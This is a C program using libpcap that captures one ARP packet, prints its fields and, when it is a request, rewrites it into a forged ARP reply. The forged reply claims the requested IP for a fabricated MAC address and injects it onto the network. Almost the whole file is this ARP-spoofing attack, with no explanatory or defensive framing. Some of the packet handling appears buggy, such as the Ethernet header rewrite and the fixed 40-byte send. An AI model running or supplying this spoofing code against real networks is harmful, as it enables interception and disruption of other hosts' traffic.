#include <pcap.h>
#include <string.h>

struct eth_header
{
	u_int8_t ether_dhost[6];
	u_int8_t ether_shost[6];
	u_int16_t ether_type;
};

struct arp_packet
{
	u_int16_t hw_type;
	u_int16_t proto_type;
	u_int8_t hw_add_len;
	u_int8_t pro_add_len;
	u_int16_t op;
	u_int8_t ether_shost[6];
	u_int8_t ip_shost[4];
	u_int8_t ether_dhost[6];
	u_int8_t ip_dhost[4];
};


int main(int argc, char **argv)
{
	//char *dev = argv[1];
	//printf("Device: %s\n", dev);
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;

	dev = pcap_lookupdev(errbuf);

	if(dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
	}
	
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Can't get netmask for device %s\n", dev);
		net = 0;
		mask = 0;
	}

	pcap_t *handle;
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL) {
		fprintf(stderr,"Couldn't open device %s", dev);
		return(2);
	}
	
	printf("Device: %s\n", dev);
	printf("IP:%08x\n", net);
	printf("NetMask:%08x\n",mask); 
	char filter_exp[] = "arp";
	struct bpf_program fp;

	if (pcap_compile(handle, &fp, filter_exp, 0 ,net) == -1){
		fprintf(stderr, "Couldn't parse filter %s %s\n", filter_exp, pcap_geterr(handle));
	}

	if (pcap_setfilter(handle, &fp) == -1){
		fprintf(stderr, "Couldn't install filter %s %s\n", filter_exp,
	pcap_geterr(handle));
	}
	
	const u_char *packet;
	struct pcap_pkthdr header;	
	packet = pcap_next(handle, &header);
	printf("packet header length: %d\n", header.len);

	struct eth_header *eptr = (struct eth_header *) packet;
	
	printf("Ethernet type hex:%x \n", ntohs(eptr->ether_type));
	printf("Dest host:%x:%x:%x:%x:%x:%x\n", eptr->ether_dhost[0],
		eptr->ether_dhost[1],
		eptr->ether_dhost[2],
		eptr->ether_dhost[3],
		eptr->ether_dhost[4],
		eptr->ether_dhost[5]);
 
	printf("Src host:%x:%x:%x:%x:%x:%x\n", eptr->ether_shost[0],
		eptr->ether_shost[1],
		eptr->ether_shost[2],
		eptr->ether_shost[3],
		eptr->ether_shost[4],
		eptr->ether_shost[5]);
		
	struct arp_packet * arpptr = (struct arp_packet *)(packet + 14);
	if(ntohs(arpptr->op) == 1)  // if arp packet is a request packet 
	{	printf("Hardware type:%x\n\
Proto	type:%x\n\
Hardware address len:%x\n\
Proto address len:%x\n\
Operator:%x\n\
Ethernet source address:%x:%x:%x:%x:%x:%x\n\
Ip	 source address:%d.%d.%d.%d\n\
Ethernet dest address:%x:%x:%x:%x:%x:%x\n\
Ip	 dest address:%d.%d.%d.%d\n",
		ntohs(arpptr->hw_type),
		ntohs(arpptr->proto_type),
		arpptr->hw_add_len,
		arpptr->pro_add_len,
		ntohs(arpptr->op),
		arpptr->ether_shost[0],
		arpptr->ether_shost[1],
		arpptr->ether_shost[2],
		arpptr->ether_shost[3],
		arpptr->ether_shost[4],
		arpptr->ether_shost[5],	
		arpptr->ip_shost[0],
		arpptr->ip_shost[1],
		arpptr->ip_shost[2],
		arpptr->ip_shost[3],
		arpptr->ether_dhost[0],
		arpptr->ether_dhost[1],
		arpptr->ether_dhost[2],
		arpptr->ether_dhost[3],
		arpptr->ether_dhost[4],
		arpptr->ether_dhost[5],	
		arpptr->ip_dhost[0],
		arpptr->ip_dhost[1],
		arpptr->ip_dhost[2],
		arpptr->ip_dhost[3]);

		//send fake arp response
		memcpy(eptr->ether_dhost, eptr->ether_shost, 6);
		eptr->ether_dhost[0] = 0xa;
		eptr->ether_dhost[1] = 0xa;
		eptr->ether_dhost[2] = 0xa;
		eptr->ether_dhost[3] = 0xa;
		eptr->ether_dhost[4] = 0xa;
		eptr->ether_dhost[5] = 0xa;	
	
		arpptr->op = htons(2);
		
		memcpy(arpptr->ether_dhost, arpptr->ether_shost, 6);
		
		arpptr->ether_shost[0] = 0xa;
		arpptr->ether_shost[1] = 0xa;
		arpptr->ether_shost[2] = 0xa;
		arpptr->ether_shost[3] = 0xa;
		arpptr->ether_shost[4] = 0xa;
		arpptr->ether_shost[5] = 0xa;
		u_int8_t ip_buffer[4];
		memcpy(ip_buffer, arpptr->ip_dhost, 4);	
		memcpy(arpptr->ip_dhost, arpptr->ip_shost, 4);
		memcpy(arpptr->ip_shost, ip_buffer, 4);
	}
	
	if(pcap_sendpacket(handle, packet, 40) == -1)
		printf("pacap_sendpacket error\n");
		
	//for(i = 0 ; i < header.len; i++) {
	//	nprintf("%x", packet,);	
	//}	
	pcap_close(handle);
	return 0;
}
